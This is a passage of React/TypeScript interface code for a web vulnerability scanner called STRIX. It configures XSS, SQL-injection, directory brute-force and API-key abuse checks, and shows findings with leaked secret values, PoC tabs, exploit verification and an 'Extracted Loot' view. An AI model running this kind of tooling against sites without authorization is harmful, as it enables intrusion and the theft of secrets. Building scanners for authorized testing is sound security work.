        let message = '';
        if (exploitable) {
            message = `⚠️ EXPLOITABLE: ${enabledCount}/${networks.length} networks enabled. Key can be abused!`;
        } else {
            message = `✓ Domain-locked: All ${networks.length} networks blocked. Key is protected.`;
        }

        setApiKeyTests(prev => new Map(prev).set(vulnId, {
            status: 'complete',
            networks: results,
            summary: {
                total: networks.length,
                enabled: enabledCount,
                disabled: networks.length - enabledCount
            },
            exploitable,
            message
        }));
    }, []);

    const handleScan = useCallback(async () => {
        if (!targetUrl.trim()) return;

        // Validate URL
        let url = targetUrl.trim();
        if (!url.startsWith('http://') && !url.startsWith('https://')) {
            url = 'https://' + url;
        }

        try {
            new URL(url);
        } catch {
            alert('Please enter a valid URL');
            return;
        }

        setIsScanning(true);
        setProgress(null);
        setResult(null);
        setLiveSeverityFilter(null);
        setExpandedLiveVuln(null);
        setApiKeyTests(new Map());

        // Parse headers if needed
        let headers: Record<string, string> = {};
        if (authHeaders) {
            try {
                authHeaders.split('\n').forEach(line => {
                    const [key, value] = line.split(':');
                    if (key && value) headers[key.trim()] = value.trim();
                });
            } catch (e) { console.error('Invalid headers format'); }
        }

        // Configure options
        const options: ScanOptions = {
            ...scanOptions,
            cookies: authType === 'cookies' ? authCookies : undefined,
            headers: Object.keys(headers).length > 0 ? headers : undefined,
            authToken: authType === 'headers' ? authToken : undefined,
            proxy: proxyEnabled ? {
                url: proxyUrl,
                username: proxyAuth ? proxyUsername : undefined,
                password: proxyAuth ? proxyPassword : undefined
            } : undefined
        };

        const scanner = new UnifiedScanner((p) => setProgress(p));

        try {
            const scanResult = await scanner.scan({
                url,
                type: 'website',
                options: options
            });
            setResult(scanResult);
        } catch (error) {
            console.error('Scan failed:', error);
        } finally {
            setIsScanning(false);
        }
    }, [targetUrl, scanOptions]);

    // Severity order for sorting (critical first)
    const severityOrder: Record<string, number> = {
        critical: 0,
        high: 1,
        medium: 2,
        low: 3,
        info: 4
    };

    const filteredVulns = (result?.vulnerabilities.filter(v => {
        if (severityFilter && v.severity !== severityFilter) return false;
        if (categoryFilter && v.category !== categoryFilter) return false;
        return true;
    }) || []).sort((a, b) => {
        // Sort by severity (critical first)
        return (severityOrder[a.severity] || 5) - (severityOrder[b.severity] || 5);
    });

    const copyToClipboard = (text: string) => {
        navigator.clipboard.writeText(text);
    };

    // Generate PDF Report
    const handleGeneratePdfReport = useCallback(async () => {
        if (!result) return;

        setIsGeneratingReport(true);
        try {
            // Small delay to show loading state
            await new Promise(resolve => setTimeout(resolve, 100));

            downloadPdfReport(result, {
                ...reportOptions,
                title: reportOptions.title || `Security Assessment - ${new URL(result.target).hostname}`,
                // Pass scan configuration for methodology section
                scanConfig: {
                    depth: scanOptions.depth as any,
                    crawlPages: scanOptions.crawlPages,
                    maxPages: scanOptions.maxPages,
                    maxDepth: scanOptions.maxDepth,
                    directoryEnum: scanOptions.directoryEnum,
                    dirWordlist: scanOptions.dirWordlist as any,
                    timeBasedTests: scanOptions.timeBasedTests,
                    testAllParams: scanOptions.testAllParams,
                    payloadsPerParam: scanOptions.payloadsPerParam,
                    delayBetweenRequests: scanOptions.delayBetweenRequests,
                    testXss: scanOptions.testXss,
                    testSqli: scanOptions.testSqli,
                    scanHeaders: scanOptions.scanHeaders,
                    scanBlockchain: scanOptions.scanBlockchain
                }
            });
        } catch (error) {
            console.error('Failed to generate PDF report:', error);
            alert('Failed to generate PDF report. Please try again.');
        } finally {
            setIsGeneratingReport(false);
            setShowReportOptions(false);
        }
    }, [result, reportOptions, scanOptions]);

    const getRiskColor = (level: string) => {
        switch (level) {
            case 'critical': return 'text-red-400';
            case 'high': return 'text-orange-400';
            case 'medium': return 'text-yellow-400';
            case 'low': return 'text-blue-400';
            default: return 'text-green-400';
        }
    };

    return (
        <div className={`h-full flex flex-col ${darkMode ? 'bg-slate-900 text-white' : 'bg-white text-gray-900'}`}>
            {/* Browser Mode Warning */}
            {!isElectron && (
                <div className={`px-4 py-3 flex items-center gap-3 ${darkMode ? 'bg-yellow-500/10 border-b border-yellow-500/30' : 'bg-yellow-50 border-b border-yellow-200'}`}>
                    <Monitor className="size-5 text-yellow-500 flex-shrink-0" />
                    <div className="flex-1">
                        <p className={`text-sm font-medium ${darkMode ? 'text-yellow-400' : 'text-yellow-700'}`}>
                            Browser Mode - Limited Scanning
                        </p>
                        <p className={`text-xs ${darkMode ? 'text-yellow-500/80' : 'text-yellow-600'}`}>
                            CORS restrictions prevent full website scanning. Run STRIX as an Electron desktop app for complete vulnerability detection.
                        </p>
                    </div>
                </div>
            )}

            {/* Header */}
            <div className={`p-4 border-b ${darkMode ? 'border-slate-700' : 'border-gray-200'}`}>
                <div className="flex items-center gap-3 mb-4">
                    <div className={`p-2 rounded-lg ${darkMode ? 'bg-cyan-500/20' : 'bg-cyan-100'}`}>
                        <Search className="size-5 text-cyan-400" />
                    </div>
                    <div>
                        <h2 className="text-lg font-bold">Web Vulnerability Scanner</h2>
                        <p className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                            Scan websites for security vulnerabilities + Web3/Blockchain detection
                        </p>
                    </div>
                </div>

                {/* URL Input */}
                <div className="flex gap-2">
                    <div className="flex-1 relative">
                        <Globe className={`absolute left-3 top-1/2 -translate-y-1/2 size-4 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`} />
                        <input
                            type="text"
                            value={targetUrl}
                            onChange={(e) => setTargetUrl(e.target.value)}
                            onKeyDown={(e) => e.key === 'Enter' && handleScan()}
                            placeholder="Enter URL to scan (e.g., https://example.com)"
                            className={`w-full pl-10 pr-4 py-2.5 rounded-lg border ${darkMode
                                ? 'bg-slate-800 border-slate-600 text-white placeholder-gray-500'
                                : 'bg-gray-50 border-gray-300 text-gray-900 placeholder-gray-400'
                                } focus:outline-none focus:ring-2 focus:ring-cyan-500`}
                        />
                    </div>
                    <button
                        onClick={() => setShowOptions(!showOptions)}
                        className={`px-3 py-2 rounded-lg border ${darkMode
                            ? 'border-slate-600 hover:bg-slate-700'
                            : 'border-gray-300 hover:bg-gray-100'
                            } transition-colors`}
                    >
                        <Filter className="size-5" />
                    </button>
                    <button
                        onClick={handleScan}
                        disabled={isScanning || !targetUrl.trim()}
                        className={`px-6 py-2 rounded-lg font-medium flex items-center gap-2 ${isScanning || !targetUrl.trim()
                            ? 'bg-gray-600 cursor-not-allowed'
                            : 'bg-cyan-600 hover:bg-cyan-700'
                            } text-white transition-colors`}
                    >
                        {isScanning ? (
                            <>
                                <Loader2 className="size-4 animate-spin" />
                                Scanning...
                            </>
                        ) : (
                            <>
                                <Play className="size-4" />
                                Scan
                            </>
                        )}
                    </button>
                </div>

                {/* Scan Options */}
                {showOptions && (
                    <div className={`mt-4 p-4 rounded-lg ${darkMode ? 'bg-slate-800' : 'bg-gray-50'}`}>
                        {/* Configuration Tabs */}
                        <div className="flex border-b border-gray-200 dark:border-gray-700 mb-4">
                            <button
                                className={`px-4 py-2 text-sm font-medium ${configTab === 'general' ? 'text-indigo-600 border-b-2 border-indigo-600' : 'text-gray-500 hover:text-gray-700'}`}
                                onClick={() => setConfigTab('general')}
                            >
                                General
                            </button>
                            <button
                                className={`px-4 py-2 text-sm font-medium ${configTab === 'auth' ? 'text-indigo-600 border-b-2 border-indigo-600' : 'text-gray-500 hover:text-gray-700'}`}
                                onClick={() => setConfigTab('auth')}
                            >
                                Authentication
                            </button>
                            <button
                                className={`px-4 py-2 text-sm font-medium ${configTab === 'network' ? 'text-indigo-600 border-b-2 border-indigo-600' : 'text-gray-500 hover:text-gray-700'}`}
                                onClick={() => setConfigTab('network')}
                            >
                                Network & Proxy
                            </button>
                        </div>

                        {/* General Tab Content */}
                        {configTab === 'general' && (
                            <div className="space-y-4">
                                <div>
                                    <div className="flex items-center justify-between mb-2">
                                        <label className={`text-sm font-medium ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>Scan Intensity</label>
                                        <div className="flex bg-gray-100 dark:bg-slate-700 rounded p-1">
                                            <button
                                                onClick={() => setScanOptions({
                                                    ...scanOptions,
                                                    depth: 'quick',
                                                    crawlPages: false,
                                                    timeBasedTests: false,
                                                    payloadsPerParam: 5
                                                })}
                                                className={`px-3 py-1 text-xs rounded transition-colors ${scanOptions.depth === 'quick' ? 'bg-white dark:bg-slate-600 shadow text-gray-900 dark:text-gray-100 font-medium' : 'text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-300'}`}
                                            >
                                                Quick
                                            </button>
                                            <button
                                                onClick={() => setScanOptions({
                                                    ...scanOptions,
                                                    depth: 'standard',
                                                    crawlPages: false,
                                                    timeBasedTests: false,
                                                    payloadsPerParam: 10
                                                })}
                                                className={`px-3 py-1 text-xs rounded transition-colors ${scanOptions.depth === 'standard' ? 'bg-white dark:bg-slate-600 shadow text-gray-900 dark:text-gray-100 font-medium' : 'text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-300'}`}
                                            >
                                                Standard
                                            </button>
                                            <button
                                                onClick={() => setScanOptions({
                                                    ...scanOptions,
                                                    depth: 'deep',
                                                    crawlPages: true,
                                                    maxPages: 50,
                                                    directoryEnum: true,
                                                    timeBasedTests: true,
                                                    payloadsPerParam: 25
                                                })}
                                                className={`px-3 py-1 text-xs rounded transition-colors ${scanOptions.depth === 'deep' ? 'bg-white dark:bg-slate-600 shadow text-gray-900 dark:text-gray-100 font-medium' : 'text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-300'}`}
                                            >
                                                Deep Scope
                                            </button>
                                        </div>
                                    </div>
                                    <p className={`text-xs ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>
                                        {scanOptions.depth === 'quick' && "Fast surface scan. Checks headers, basic exposures, and known vulnerabilities."}
                                        {scanOptions.depth === 'standard' && "Balanced scan. Includes limited crawling and standard injection tests."}
                                        {scanOptions.depth === 'deep' && "Comprehensive scan. Crawls site (limit 50 pages), directory bruteforce, time-based SQLi."}
                                    </p>
                                </div>

                                <div className="grid grid-cols-2 gap-4">
                                    <label className="flex items-center gap-2 cursor-pointer">
                                        <input
                                            type="checkbox"
                                            checked={scanOptions.testXss}
                                            onChange={e => setScanOptions({ ...scanOptions, testXss: e.target.checked })}
                                            className="w-4 h-4 text-indigo-600 rounded"
                                        />
                                        <span className={`text-sm ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>XSS Scanning</span>
                                    </label>
                                    <label className="flex items-center gap-2 cursor-pointer">
                                        <input
                                            type="checkbox"
                                            checked={scanOptions.testSqli}
                                            onChange={e => setScanOptions({ ...scanOptions, testSqli: e.target.checked })}
                                            className="w-4 h-4 text-indigo-600 rounded"
                                        />
                                        <span className={`text-sm ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>SQL Injection</span>
                                    </label>
                                    <label className="flex items-center gap-2 cursor-pointer">
                                        <input
                                            type="checkbox"
                                            checked={scanOptions.scanBlockchain}
                                            onChange={e => setScanOptions({ ...scanOptions, scanBlockchain: e.target.checked })}
                                            className="w-4 h-4 text-indigo-600 rounded"
                                        />
                                        <span className={`text-sm ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>Blockchain/Web3</span>
                                    </label>
                                    <label className="flex items-center gap-2 cursor-pointer">
                                        <input
                                            type="checkbox"
                                            checked={scanOptions.crawlPages}
                                            onChange={e => setScanOptions({ ...scanOptions, crawlPages: e.target.checked })}
                                            className="w-4 h-4 text-indigo-600 rounded"
                                        />
                                        <span className={`text-sm ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>Crawl & Discover</span>
                                    </label>
                                </div>
                            </div>
                        )}

                        {/* Auth Tab Content */}
                        {configTab === 'auth' && (
                            <div className="space-y-4">
                                <div className="flex gap-4 mb-4">
                                    <label className="flex items-center gap-2 cursor-pointer">
                                        <input
                                            type="radio"
                                            name="authType"
                                            checked={authType === 'none'}
                                            onChange={() => setAuthType('none')}
                                            className="w-4 h-4 text-indigo-600"
                                        />
                                        <span className={darkMode ? 'text-gray-300' : 'text-gray-700'}>None</span>
                                    </label>
                                    <label className="flex items-center gap-2 cursor-pointer">
                                        <input
                                            type="radio"
                                            name="authType"
                                            checked={authType === 'cookies'}
                                            onChange={() => setAuthType('cookies')}
                                            className="w-4 h-4 text-indigo-600"
                                        />
                                        <span className={darkMode ? 'text-gray-300' : 'text-gray-700'}>Session Cookies</span>
                                    </label>
                                    <label className="flex items-center gap-2 cursor-pointer">
                                        <input
                                            type="radio"
                                            name="authType"
                                            checked={authType === 'headers'}
                                            onChange={() => setAuthType('headers')}
                                            className="w-4 h-4 text-indigo-600"
                                        />
                                        <span className={darkMode ? 'text-gray-300' : 'text-gray-700'}>Custom Headers</span>
                                    </label>
                                </div>

                                {authType === 'cookies' && (
                                    <div>
                                        <label className={`block text-xs font-semibold mb-1 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>Cookie String</label>
                                        <textarea
                                            value={authCookies}
                                            onChange={e => setAuthCookies(e.target.value)}
                                            placeholder="session_id=...; other_cookie=..."
                                            className={`w-full p-2 text-sm rounded border font-mono h-24 ${darkMode ? 'bg-slate-900 border-gray-600 text-gray-200' : 'bg-white border-gray-300'}`}
                                        />
                                        <p className="text-xs text-gray-500 mt-1">Copy raw Cookie header from browser DevTools</p>
                                    </div>
                                )}

                                {authType === 'headers' && (
                                    <div>
                                        <label className={`block text-xs font-semibold mb-1 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>Authorization Headers</label>
                                        <textarea
                                            value={authHeaders}
                                            onChange={e => setAuthHeaders(e.target.value)}
                                            placeholder="Authorization: Bearer eyJ...&#10;X-Custom-Auth: value"
                                            className={`w-full p-2 text-sm rounded border font-mono h-24 ${darkMode ? 'bg-slate-900 border-gray-600 text-gray-200' : 'bg-white border-gray-300'}`}
                                        />
                                    </div>
                                )}
                            </div>
                        )}

                        {/* Network/Proxy Tab Content */}
                        {configTab === 'network' && (
                            <div className="space-y-4">
                                <div className="flex items-center justify-between">
                                    <label className={`text-sm font-medium ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>Use Proxy</label>
                                    <div className="relative inline-block w-10 h-6 align-middle select-none transition duration-200 ease-in">
                                        <input
                                            type="checkbox"
                                            checked={proxyEnabled}
                                            onChange={e => setProxyEnabled(e.target.checked)}
                                            className="toggle-checkbox absolute block w-4 h-4 rounded-full bg-white border-4 appearance-none cursor-pointer translate-x-0 transition-transform duration-200 ease-in-out check:translate-x-4"
                                            style={{ left: proxyEnabled ? '1.25rem' : '0.25rem', top: '0.25rem' }}
                                        />
                                        <div
                                            onClick={() => setProxyEnabled(!proxyEnabled)}
                                            className={`toggle-label block overflow-hidden h-6 rounded-full cursor-pointer ${proxyEnabled ? 'bg-indigo-600' : 'bg-gray-300'}`}
                                        ></div>
                                    </div>
                                </div>

                                {proxyEnabled && (
                                    <div className="space-y-3 p-3 rounded border border-gray-200 dark:border-gray-700">
                                        <div>
                                            <label className={`block text-xs font-semibold mb-1 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>Proxy URL</label>
                                            <input
                                                type="text"
                                                value={proxyUrl}
                                                onChange={e => setProxyUrl(e.target.value)}
                                                placeholder="http://127.0.0.1:8080"
                                                className={`w-full p-2 text-sm rounded border ${darkMode ? 'bg-slate-900 border-gray-600 text-gray-200' : 'bg-white border-gray-300'}`}
                                            />
                                        </div>
                                        <label className="flex items-center gap-2 cursor-pointer mt-2">
                                            <input
                                                type="checkbox"
                                                checked={proxyAuth}
                                                onChange={e => setProxyAuth(e.target.checked)}
                                                className="w-4 h-4 text-indigo-600 rounded"
                                            />
                                            <span className={`text-sm ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>Proxy Authentication</span>
                                        </label>
                                        {proxyAuth && (
                                            <div className="grid grid-cols-2 gap-3">
                                                <div>
                                                    <input
                                                        type="text"
                                                        value={proxyUsername}
                                                        onChange={e => setProxyUsername(e.target.value)}
                                                        placeholder="Username"
                                                        className={`w-full p-2 text-sm rounded border ${darkMode ? 'bg-slate-900 border-gray-600 text-gray-200' : 'bg-white border-gray-300'}`}
                                                    />
                                                </div>
                                                <div>
                                                    <input
                                                        type="password"
                                                        value={proxyPassword}
                                                        onChange={e => setProxyPassword(e.target.value)}
                                                        placeholder="Password"
                                                        className={`w-full p-2 text-sm rounded border ${darkMode ? 'bg-slate-900 border-gray-600 text-gray-200' : 'bg-white border-gray-300'}`}
                                                    />
                                                </div>
                                            </div>
                                        )}
                                    </div>
                                )}
                            </div>
                        )}
                    </div>
                )}

                {/* Progress with Live Findings */}
                {isScanning && progress && (
                    <div className={`mt-4 rounded-lg ${darkMode ? 'bg-slate-800' : 'bg-gray-50'}`}>
                        {/* Progress bar section */}
                        <div className="p-3 border-b border-slate-700/50">
                            <div className="flex items-center justify-between mb-2">
                                <span className="text-sm font-medium flex items-center gap-2">
                                    <Loader2 className="size-4 animate-spin text-cyan-400" />
                                    {progress.phase}
                                </span>
                                <span className="text-sm text-gray-400">{progress.current}/{progress.total}</span>
                            </div>
                            <div className={`h-2 rounded-full ${darkMode ? 'bg-slate-700' : 'bg-gray-200'}`}>
                                <div
                                    className="h-full bg-cyan-500 rounded-full transition-all"
                                    style={{ width: `${(progress.current / progress.total) * 100}%` }}
                                />
                            </div>
                            <p className={`text-xs mt-2 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                {progress.message}
                            </p>
                        </div>

                        {/* Live findings summary */}
                        {progress.currentFindings && progress.currentFindings.length > 0 && (
                            <div className="p-3">
                                <div className="flex items-center justify-between mb-3">
                                    <span className="text-sm font-medium">Live Findings ({progress.findings})</span>
                                    {/* Clickable severity filters */}
                                    <div className="flex gap-1 text-xs">
                                        <button
                                            onClick={() => setLiveSeverityFilter(liveSeverityFilter === 'critical' ? null : 'critical')}
                                            className={`px-2 py-0.5 rounded transition-all cursor-pointer ${liveSeverityFilter === 'critical'
                                                ? 'bg-red-500 text-white ring-2 ring-red-400'
                                                : 'bg-red-500/20 text-red-400 hover:bg-red-500/40'
                                                }`}
                                        >
                                            {progress.currentFindings.filter(v => v.severity === 'critical').length} Critical
                                        </button>
                                        <button
                                            onClick={() => setLiveSeverityFilter(liveSeverityFilter === 'high' ? null : 'high')}
                                            className={`px-2 py-0.5 rounded transition-all cursor-pointer ${liveSeverityFilter === 'high'
                                                ? 'bg-orange-500 text-white ring-2 ring-orange-400'
                                                : 'bg-orange-500/20 text-orange-400 hover:bg-orange-500/40'
                                                }`}
                                        >
                                            {progress.currentFindings.filter(v => v.severity === 'high').length} High
                                        </button>
                                        <button
                                            onClick={() => setLiveSeverityFilter(liveSeverityFilter === 'medium' ? null : 'medium')}
                                            className={`px-2 py-0.5 rounded transition-all cursor-pointer ${liveSeverityFilter === 'medium'
                                                ? 'bg-yellow-500 text-white ring-2 ring-yellow-400'
                                                : 'bg-yellow-500/20 text-yellow-400 hover:bg-yellow-500/40'
                                                }`}
                                        >
                                            {progress.currentFindings.filter(v => v.severity === 'medium').length} Med
                                        </button>
                                        <button
                                            onClick={() => setLiveSeverityFilter(liveSeverityFilter === 'low' ? null : 'low')}
                                            className={`px-2 py-0.5 rounded transition-all cursor-pointer ${liveSeverityFilter === 'low'
                                                ? 'bg-blue-500 text-white ring-2 ring-blue-400'
                                                : 'bg-blue-500/20 text-blue-400 hover:bg-blue-500/40'
                                                }`}
                                        >
                                            {progress.currentFindings.filter(v => v.severity === 'low').length} Low
                                        </button>
                                        <button
                                            onClick={() => setLiveSeverityFilter(liveSeverityFilter === 'info' ? null : 'info')}
                                            className={`px-2 py-0.5 rounded transition-all cursor-pointer ${liveSeverityFilter === 'info'
                                                ? 'bg-gray-500 text-white ring-2 ring-gray-400'
                                                : 'bg-gray-500/20 text-gray-400 hover:bg-gray-500/40'
                                                }`}
                                        >
                                            {progress.currentFindings.filter(v => v.severity === 'info').length} Info
                                        </button>
                                    </div>
                                </div>

                                {/* Live findings list - filtered and expandable */}
                                <div className="space-y-1 max-h-80 overflow-y-auto">
                                    {(() => {
                                        // Filter and prepare findings
                                        let filtered = [...progress.currentFindings];
                                        if (liveSeverityFilter) {
                                            filtered = filtered.filter(v => v.severity === liveSeverityFilter);
                                        }
                                        // Sort by severity then reverse for newest first
                                        const severityOrder: Record<string, number> = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
                                        filtered.sort((a, b) => severityOrder[a.severity] - severityOrder[b.severity]);

                                        const displayFindings = filtered.slice(0, 20);
                                        const remaining = filtered.length - displayFindings.length;

                                        return (
                                            <>
                                                {displayFindings.map((vuln, idx) => {
                                                    const isExpanded = expandedLiveVuln === vuln.id;
                                                    const isNewest = idx === 0 && !liveSeverityFilter;

                                                    return (
                                                        <div key={idx} className="space-y-0">
                                                            {/* Finding row - clickable */}
                                                            <button
                                                                onClick={() => setExpandedLiveVuln(expandedLiveVuln === vuln.id ? null : vuln.id)}
                                                                className={`w-full flex items-center gap-2 p-2 rounded text-xs text-left transition-all ${darkMode ? 'bg-slate-700/50 hover:bg-slate-700' : 'bg-gray-100 hover:bg-gray-200'
                                                                    } ${isNewest ? 'animate-pulse' : ''} ${expandedLiveVuln === vuln.id ? 'ring-1 ring-cyan-500' : ''}`}
                                                            >
                                                                <span className={`px-1.5 py-0.5 rounded text-[10px] font-bold uppercase shrink-0 ${vuln.severity === 'critical' ? 'bg-red-500/30 text-red-400' :
                                                                    vuln.severity === 'high' ? 'bg-orange-500/30 text-orange-400' :
                                                                        vuln.severity === 'medium' ? 'bg-yellow-500/30 text-yellow-400' :
                                                                            vuln.severity === 'low' ? 'bg-blue-500/30 text-blue-400' :
                                                                                'bg-gray-500/30 text-gray-400'
                                                                    }`}>
                                                                    {vuln.severity.slice(0, 4)}
                                                                </span>
                                                                <span className="truncate flex-1">{vuln.title}</span>
                                                                <span className={`truncate max-w-32 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>
                                                                    {vuln.url ? new URL(vuln.url).pathname.slice(0, 25) : ''}
                                                                </span>
                                                                {isExpanded ? (
                                                                    <ChevronUp className="size-3 shrink-0 text-cyan-400" />
                                                                ) : (
                                                                    <ChevronDown className="size-3 shrink-0 text-gray-500" />
                                                                )}
                                                            </button>

                                                            {/* Expanded details */}
                                                            {isExpanded && (
                                                                <div className={`mt-1 p-3 rounded text-xs space-y-2 ${darkMode ? 'bg-slate-900/50 border border-slate-700' : 'bg-white border border-gray-200'
                                                                    }`}>
                                                                    <div>
                                                                        <span className={`font-medium ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>Category: </span>
                                                                        <span className="capitalize">{vuln.category}</span>
                                                                    </div>
                                                                    {vuln.url && (
                                                                        <div>
                                                                            <span className={`font-medium ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>URL: </span>
                                                                            <span className="font-mono break-all">{vuln.url}</span>
                                                                        </div>
                                                                    )}
                                                                    <div>
                                                                        <span className={`font-medium ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>Description: </span>
                                                                        <span>{vuln.description}</span>
                                                                    </div>
                                                                    {vuln.evidence && (
                                                                        <div>
                                                                            <span className={`font-medium ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>Evidence: </span>
                                                                            <pre className={`mt-1 p-2 rounded font-mono text-[10px] overflow-x-auto whitespace-pre-wrap ${darkMode ? 'bg-slate-800' : 'bg-gray-100'
                                                                                }`}>
                                                                                {vuln.evidence.slice(0, 500)}{vuln.evidence.length > 500 ? '...' : ''}
                                                                            </pre>
                                                                        </div>
                                                                    )}
                                                                    {vuln.recommendation && (
                                                                        <div>
                                                                            <span className={`font-medium ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>Recommendation: </span>
                                                                            <span>{vuln.recommendation}</span>
                                                                        </div>
                                                                    )}
                                                                    {/* Secret-specific details */}
                                                                    {vuln.secretService && (
                                                                        <div className={`p-2 rounded ${darkMode ? 'bg-red-900/20 border border-red-800/50' : 'bg-red-50 border border-red-200'}`}>
                                                                            <div className="font-medium text-red-400 mb-1">🔑 {vuln.secretService}</div>
                                                                            {vuln.secretServiceDesc && <div className="text-gray-400">{vuln.secretServiceDesc}</div>}
                                                                            {vuln.secretValue && (
                                                                                <div className="mt-1">
                                                                                    <span className="text-gray-400">Value: </span>
                                                                                    <code className="font-mono bg-black/30 px-1 rounded break-all">{vuln.secretValue}</code>
                                                                                </div>
                                                                            )}
                                                                            {vuln.secretImpact && (
                                                                                <div className="mt-1 text-yellow-400">{vuln.secretImpact}</div>
                                                                            )}
                                                                        </div>
                                                                    )}

                                                                    {/* PoC and Exploit Section for Live Findings */}
                                                                    {['xss', 'injection', 'sqli', 'ssrf', 'rce', 'lfi'].includes(vuln.category) && vuln.url && (
                                                                        <div className={`mt-2 pt-2 border-t ${darkMode ? 'border-slate-700' : 'border-gray-200'}`}>
                                                                            <div className="flex items-center justify-between mb-2">
                                                                                <div className="flex items-center gap-2">
                                                                                    <FlaskConical className="size-3 text-purple-400" />
                                                                                    <span className="font-medium text-[10px]">Verification & PoC</span>
                                                                                </div>
                                                                                <div className="flex gap-1 bg-gray-100 dark:bg-slate-700/50 p-0.5 rounded">
                                                                                    {(['curl', 'python', 'javascript'] as const).map(lang => (
                                                                                        <button
                                                                                            key={lang}
                                                                                            onClick={(e) => {
                                                                                                e.stopPropagation();
                                                                                                setActivePocTabs(prev => ({ ...prev, [vuln.id]: lang }));
                                                                                            }}
                                                                                            className={`px-1.5 py-0.5 text-[9px] rounded capitalize transition-all ${(activePocTabs[vuln.id] || 'curl') === lang
                                                                                                ? 'bg-white dark:bg-slate-600 shadow text-indigo-400'
                                                                                                : 'text-gray-500 hover:text-gray-300'
                                                                                                }`}
                                                                                        >
                                                                                            {lang}
                                                                                        </button>
                                                                                    ))}
                                                                                </div>
                                                                            </div>

                                                                            {/* Exploit Result Area - Rewritten for safety & performance */}
                                                                            {(() => {
                                                                                const test = exploitTests.get(vuln.id);
                                                                                if (!test) return null;

                                                                                return (
                                                                                    <div className={`mb-3 rounded overflow-hidden border ${test.status === 'running'
                                                                                        ? 'bg-blue-500/5 border-blue-500/20'
                                                                                        : test.verified
                                                                                            ? 'bg-red-500/5 border-red-500/20'
                                                                                            : 'bg-green-500/5 border-green-500/20'
                                                                                        }`}>
                                                                                        {/* Header/Status */}
                                                                                        <div className={`p-2 flex items-center justify-between border-b ${test.verified ? 'border-red-500/20' : 'border-gray-700/50'}`}>
                                                                                            <div className="flex items-center gap-2">
                                                                                                <span className={`text-[10px] font-bold flex items-center gap-1 ${test.verified ? 'text-red-400' : 'text-blue-400'}`}>
                                                                                                    {test.status === 'running' && <Loader2 className="size-2.5 animate-spin" />}
                                                                                                    {test.message}
                                                                                                </span>
                                                                                            </div>
                                                                                            {test.verified && (
                                                                                                <span className="bg-red-600 text-white text-[9px] px-1.5 py-0.5 rounded font-black animate-pulse shadow-sm">VERIFIED VULNERABLE</span>
                                                                                            )}
                                                                                        </div>

                                                                                        {/* Analysis Explanation */}
                                                                                        {test.explanation && (
                                                                                            <div className={`px-2 py-1.5 text-[9px] italic border-b border-gray-700/30 ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>
                                                                                                Analysis: {test.explanation}
                                                                                            </div>
                                                                                        )}

                                                                                        {/* Response Inspector Area */}
                                                                                        {test.response && (
                                                                                            <div className={`flex flex-col max-h-96 ${darkMode ? 'bg-slate-950' : 'bg-gray-100'} border-t border-gray-800`}>
                                                                                                {/* High-Contrast Tab System */}
                                                                                                <div className="flex bg-slate-900 border-b border-white/5">
                                                                                                    {test.extractedLoot && test.extractedLoot.length > 0 && (
                                                                                                        <button
                                                                                                            onClick={() => setActiveInspectTabs(prev => ({ ...prev, [vuln.id]: 'loot' }))}
                                                                                                            className={`px-3 py-2 text-[10px] font-bold uppercase tracking-wider flex items-center gap-1.5 transition-all ${(activeInspectTabs[vuln.id] === 'loot' || (!activeInspectTabs[vuln.id] && test.extractedLoot.length > 0)) ? 'bg-purple-600/20 text-purple-400 border-b-2 border-purple-500' : 'text-gray-500 hover:text-gray-300'}`}
                                                                                                        >
                                                                                                            <Database className="size-3" />
                                                                                                            Extracted Loot ({test.extractedLoot.length})
                                                                                                        </button>
                                                                                                    )}
                                                                                                    <button
                                                                                                        onClick={() => setActiveInspectTabs(prev => ({ ...prev, [vuln.id]: 'body' }))}
                                                                                                        className={`px-3 py-2 text-[10px] font-bold uppercase tracking-wider flex items-center gap-1.5 transition-all ${(activeInspectTabs[vuln.id] === 'body' || (!activeInspectTabs[vuln.id] && (!test.extractedLoot || test.extractedLoot.length === 0)) || (activeInspectTabs[vuln.id] !== 'headers' && activeInspectTabs[vuln.id] !== 'loot')) ? 'bg-cyan-600/20 text-cyan-400 border-b-2 border-cyan-500' : 'text-gray-500 hover:text-gray-300'}`}
                                                                                                    >
                                                                                                        <FileCode className="size-3" />
                                                                                                        Full Response
                                                                                                    </button>
                                                                                                    <button
                                                                                                        onClick={() => setActiveInspectTabs(prev => ({ ...prev, [vuln.id]: 'headers' }))}
                                                                                                        className={`px-3 py-2 text-[10px] font-bold uppercase tracking-wider flex items-center gap-1.5 transition-all ${(activeInspectTabs[vuln.id] === 'headers') ? 'bg-orange-600/20 text-orange-400 border-b-2 border-orange-500' : 'text-gray-500 hover:text-gray-300'}`}
                                                                                                    >
                                                                                                        <Activity className="size-3" />
                                                                                                        Headers
                                                                                                    </button>
                                                                                                </div>

                                                                                                {/* View Rendering */}
                                                                                                <div className="overflow-auto min-h-[150px]">
                                                                                                    {/* LOOT VIEW */}
                                                                                                    {(activeInspectTabs[vuln.id] === 'loot' || (!activeInspectTabs[vuln.id] && test.extractedLoot && test.extractedLoot.length > 0)) && (
                                                                                                        <div className="p-3 space-y-2 animate-in fade-in slide-in-from-bottom-1">
                                                                                                            {test.extractedLoot?.map((loot, i) => (
